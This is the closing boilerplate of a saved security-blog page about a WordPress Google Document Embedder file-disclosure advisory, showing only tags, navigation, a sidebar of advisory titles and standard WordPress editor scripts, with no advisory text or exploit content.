+				This entry was tagged <a href="http://ceriksen.com/tag/file-disclosure/" rel="tag">File Disclosure</a>, <a href="http://ceriksen.com/tag/google-document-embedder/" rel="tag">Google Document Embedder</a>, <a href="http://ceriksen.com/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>. Bookmark the <a href="http://ceriksen.com/2013/01/03/wordpress-google-document-embedder-arbitrary-file-disclosure/" title="Permalink to WordPress Google Document Embedder arbitrary file disclosure" rel="bookmark">permalink</a>.
+					</footer><!-- .entry-meta -->
+</article><!-- #post-167 -->
+
+					<nav id="nav-below">
+		<h2 class="assistive-text">Post navigation</h2>
+
+		
+					<div class="nav-previous"><a href="http://ceriksen.com/2013/01/02/wordpress-duplicator-plugin-arbitrary-file-disclosure/" rel="prev"><span class="meta-nav">&larr;</span> WordPress Duplicator plugin arbitrary file disclosure</a></div>			<div class="nav-next"><a href="http://ceriksen.com/2013/01/12/wordpress-zingiri-forums-arbitrary-file-disclosure/" rel="next">WordPress Zingiri Forums arbitrary file disclosure <span class="meta-nav">&rarr;</span></a></div>						
+	
+	</nav><!-- #nav-below -->
+	
+						<div id="comments">
+	
+	
+	
+									<div id="respond" class="comment-respond">
+				<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/2013/01/03/wordpress-google-document-embedder-arbitrary-file-disclosure/#respond" style="display:none;">Cancel reply</a></small></h3>
+									<p class="must-log-in">You must be <a href="http://ceriksen.com/wp-login.php?redirect_to=http%3A%2F%2Fceriksen.com%2F2013%2F01%2F03%2Fwordpress-google-document-embedder-arbitrary-file-disclosure%2F">logged in</a> to post a comment.</p>												</div><!-- #respond -->
+			
+</div><!-- #comments -->
+
+			
+			</div><!-- #content -->
+		</div><!-- #primary -->
+
+			<div id="secondary" class="widget-area" role="complementary">
+			<aside id="text-2" class="widget widget_text"><h3 class="widget-title">Upcoming advisories</h3>			<div class="textwidget"><p>SA51412<br />
+SA51348<br />
+SA51344<br />
+SA51336 </p>
+</div>
+		</aside><aside id="categories-4" class="widget widget_categories"><h3 class="widget-title">Categories</h3>		<ul>
+	<li class="cat-item cat-item-3"><a href="http://ceriksen.com/category/advisories/" title="View all posts filed under Advisories">Advisories</a> (34)
+</li>
+	<li class="cat-item cat-item-12"><a href="http://ceriksen.com/category/privacy/" title="View all posts filed under Privacy">Privacy</a> (5)
+</li>
+	<li class="cat-item cat-item-30"><a href="http://ceriksen.com/category/security/" title="View all posts filed under Security">Security</a> (7)
+</li>
+		</ul>
+</aside>		<aside id="recent-posts-4" class="widget widget_recent_entries">		<h3 class="widget-title">Recent posts</h3>		<ul>
+					<li>
+				<a href="http://ceriksen.com/2013/08/20/graphite-remote-code-execution-vulnerability-advisory/">Graphite remote code execution vulnerability advisory</a>
+						</li>
+					<li>
+				<a href="http://ceriksen.com/2013/08/06/squash-remote-code-execution-vulnerability-advisory/">Squash remote code execution vulnerability advisory</a>
+						</li>
+					<li>
+				<a href="http://ceriksen.com/2013/06/18/bsides-rhode-island-presentation-and-slides/">BSides Rhode Island presentation and slides</a>
+						</li>
+					<li>
+				<a href="http://ceriksen.com/2013/05/24/cve-2012-6399-or-how-your-cisco-webex-meetings-arent-very-confidential-on-ios/">CVE-2012-6399 &#8211; Or how your Cisco WebEx meetings aren&#8217;t very confidential on iOS</a>
+						</li>
+					<li>
+				<a href="http://ceriksen.com/2013/05/16/credit-card-numbers-third-parties-and-you/">Credit card numbers, third parties and you</a>
+						</li>
+					<li>
+				<a href="http://ceriksen.com/2013/05/09/cve-2013-2692-or-when-your-openvpn-is-a-bit-too-open/">CVE-2013-2692 &#8211; Or when your OpenVPN is a bit too open</a>
+						</li>
+					<li>
+				<a href="http://ceriksen.com/2013/05/03/conditional-csrf-or-how-to-spray-without-praying/">Conditional CSRF &#8211; Or how to spray without praying</a>
+						</li>
+					<li>
+				<a href="http://ceriksen.com/2013/05/01/wordpress-csrf-exploit-kit-a-novel-approach-to-exploiting-wordpress-plugins/">WordPress CSRF Exploit kit &#8211; A novel approach to exploiting WordPress plugins</a>
+						</li>
+					<li>
+				<a href="http://ceriksen.com/2013/03/17/amd-catalyst-driver-update-vulnerability/">AMD Catalyst driver update vulnerability</a>
+						</li>
+					<li>
+				<a href="http://ceriksen.com/2013/02/18/wordpress-online-store-local-file-inclusion-vulnerability/">WordPress Online Store local file inclusion vulnerability</a>
+						</li>
+				</ul>
+		</aside>		</div><!-- #secondary .widget-area -->
+	
+	</div><!-- #main -->
+	
+	
+	<footer id="colophon" role="contentinfo">
+		<div id="site-generator">
+						<a href="http://wordpress.org/" title="Semantic Personal Publishing Platform" rel="generator">Powered by WordPress</a> &amp;	<a href="http://wpshoppe.com/" title="Minimalist WordPress Themes" rel="generator">simpleX</a>.
+					
+		</div>
+	</footer><!-- #colophon -->
+	
+		
+</div><!-- #page -->
+
+<link rel='stylesheet' id='wp-jquery-ui-dialog-css'  href='http://ceriksen.com/wp-includes/css/jquery-ui-dialog.min.css?ver=3.8.3' type='text/css' media='all' />
+<script type='text/javascript'>
+/* <![CDATA[ */
+var wordCountL10n = {"type":"w"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://ceriksen.com/wp-admin/js/word-count.min.js?ver=3.8.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.core.min.js?ver=1.10.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.widget.min.js?ver=1.10.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.mouse.min.js?ver=1.10.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.resizable.min.js?ver=1.10.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.draggable.min.js?ver=1.10.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.button.min.js?ver=1.10.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.position.min.js?ver=1.10.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/jquery/ui/jquery.ui.dialog.min.js?ver=1.10.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/tinymce/plugins/wpdialogs/js/wpdialog.min.js?ver=3.8.3'></script>
+<script type='text/javascript'>
+/* <![CDATA[ */
+var wpLinkL10n = {"title":"Insert\/edit link","update":"Update","save":"Add Link","noTitle":"(no title)","noMatchesFound":"No matches found."};
+/* ]]> */
+</script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/wplink.min.js?ver=3.8.3'></script>
+<script type='text/javascript' src='http://ceriksen.com/wp-includes/js/tinymce/plugins/wpdialogs/js/popup.min.js?ver=3.8.3'></script>
+
+	<script type="text/javascript">
+		tinyMCEPreInit = {
+			base : "",
+			suffix : "",
+			query : "ver=359-20131026",
+			mceInit : {},
+			qtInit : {'comment':{id:"comment",buttons:"strong,em,link,block,del,ins,img,ul,ol,li,code,more,close"}},
+			ref : {plugins:"",theme:"advanced",language:""},
+			load_ext : function(url,lang){var sl=tinymce.ScriptLoader;sl.markDone(url+'/langs/'+lang+'.js');sl.markDone(url+'/langs/'+lang+'_dlg.js');}
+		};
+	</script>
+
+	<script type="text/javascript">
+		var wpActiveEditor;
+
+		(function(){
+			var init, ed, qt, first_init, DOM, el, i, mce = 0;
+
+			if ( typeof(tinymce) == 'object' ) {
+				DOM = tinymce.DOM;
+				// mark wp_theme/ui.css as loaded
+				DOM.files[tinymce.baseURI.getURI() + '/themes/advanced/skins/wp_theme/ui.css'] = true;
+
+				DOM.events.add( DOM.select('.wp-editor-wrap'), 'mousedown', function(e){
+					if ( this.id )
+						wpActiveEditor = this.id.slice(3, -5);
+				});
+
+				for ( ed in tinyMCEPreInit.mceInit ) {
+					if ( first_init ) {
+						init = tinyMCEPreInit.mceInit[ed] = tinymce.extend( {}, first_init, tinyMCEPreInit.mceInit[ed] );
+					} else {
+						init = first_init = tinyMCEPreInit.mceInit[ed];
+					}
+
+					if ( mce )
+						try { tinymce.init(init); } catch(e){}
+				}
+			} else {
+				if ( tinyMCEPreInit.qtInit ) {
+					for ( i in tinyMCEPreInit.qtInit ) {
+						el = tinyMCEPreInit.qtInit[i].id;
+						if ( el )
+							document.getElementById('wp-'+el+'-wrap').onmousedown = function(){ wpActiveEditor = this.id.slice(3, -5); }
+					}
+				}
+			}
+
+			if ( typeof(QTags) == 'function' ) {
+				for ( qt in tinyMCEPreInit.qtInit ) {
+					try { quicktags( tinyMCEPreInit.qtInit[qt] ); } catch(e){}
+				}
+			}
+		})();
+		var ajaxurl = "/wp-admin/admin-ajax.php";		</script>
+			<div style="display:none;">
+	<form id="wp-link" tabindex="-1">
+	<input type="hidden" id="_ajax_linking_nonce" name="_ajax_linking_nonce" value="a25a108328" />	<div id="link-selector">
+		<div id="link-options">
+			<p class="howto">Enter the destination URL</p>
+			<div>
+				<label><span>URL</span><input id="url-field" type="text" name="href" /></label>
+			</div>
+			<div>
+				<label><span>Title</span><input id="link-title-field" type="text" name="linktitle" /></label>
+			</div>
+			<div class="link-target">
+				<label><input type="checkbox" id="link-target-checkbox" /> Open link in a new window/tab</label>
+			</div>
+		</div>
+				<p class="howto toggle-arrow " id="internal-toggle">Or link to existing content</p>
+		<div id="search-panel" style="display:none">
+			<div class="link-search-wrapper">
+				<label>
+					<span class="search-label">Search</span>
+					<input type="search" id="search-field" class="link-search-field" autocomplete="off" />
+					<span class="spinner"></span>
+				</label>
+			</div>
+			<div id="search-results" class="query-results">
+				<ul></ul>
+				<div class="river-waiting">
+					<span class="spinner"></span>
+				</div>
+			</div>
+			<div id="most-recent-results" class="query-results">
+				<div class="query-notice"><em>No search term specified. Showing recent items.</em></div>
+				<ul></ul>
+				<div class="river-waiting">
+					<span class="spinner"></span>
+				</div>
+			</div>
+		</div>
+	</div>
+	<div class="submitbox">
+		<div id="wp-link-update">
+			<input type="submit" value="Add Link" class="button-primary" id="wp-link-submit" name="wp-link-submit">
+		</div>
+		<div id="wp-link-cancel">
+			<a class="submitdelete deletion" href="#">Cancel</a>
+		</div>
+	</div>
+	</form>
+	</div>
+	
+</body>
+</html>
+<!-- Performance optimized by W3 Total Cache. Learn more: http://www.w3-edge.com/wordpress-plugins/
+
+Page Caching using disk: enhanced
+
+ Served from: ceriksen.com @ 2014-07-18 20:45:58 by W3 Total Cache -->
